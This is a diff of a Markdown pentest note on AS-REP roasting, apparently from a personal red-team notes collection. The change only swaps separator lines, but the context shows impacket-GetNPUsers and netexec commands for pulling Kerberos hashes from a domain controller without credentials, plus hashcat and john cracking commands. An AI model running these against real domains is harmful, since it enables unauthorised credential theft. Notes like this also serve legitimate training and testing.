@@ -17,7 +17,7 @@ linked:
 ---
 # AS-REP Roasting - Roast Without Auth
 
-***
+---
 
 ## Concept
 
@@ -29,7 +29,7 @@ linked:
 | Use case | Pre-foothold inicial (sin creds del domain) | First-attempt vector. |
 ^asrep-unauth-concept
 
-___
+---
 
 ## Impacket GetNPUsers (Unauth)
 
@@ -52,7 +52,7 @@ impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 \
 # (users sin DONT_REQ_PREAUTH = silent skip)
 ```
 
-___
+---
 
 ## netexec (Unauth)
 
@@ -67,7 +67,7 @@ ___
 nxc ldap <DC> -u users.txt -p '' --asreproast asrep.hash
 ```
 
-___
+---
 
 ## Username List Generation
 
@@ -98,7 +98,7 @@ impacket-GetNPUsers corp.local/ -dc-ip <DC> \
   -format hashcat -outputfile asrep.hash
 ```
 
-___
+---
 
 ## Per-User Single Test
 
@@ -119,7 +119,7 @@ impacket-GetNPUsers corp.local/jsmith -dc-ip <DC> -no-pass
 # [-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-___
+---
 
 ## OPSEC Considerations
 
@@ -133,7 +133,7 @@ ___
 | AS-REP request from non-domain-joined source IP | Anomaly | Defender. |
 ^asrep-unauth-opsec
 
-___
+---
 
 ## Common Errors
 
@@ -147,7 +147,7 @@ ___
 | Output file vacío | Sin users vulnerables o user list inválida | Validate users primero con kerbrute. |
 ^asrep-unauth-errors
 
-___
+---
 
 ## Hash Format
 
@@ -162,7 +162,7 @@ $krb5asrep$23$user@CORP.LOCAL:abc123def456789...
 # abc123...  = encrypted blob (crackeable)
 ```
 
-___
+---
 
 ## Crack Pipeline
 
@@ -180,4 +180,4 @@ john --format=krb5asrep --wordlist=rockyou.txt asrep.hash
 hashcat -m 18200 asrep.hash --show
 ```
 
-***
+---
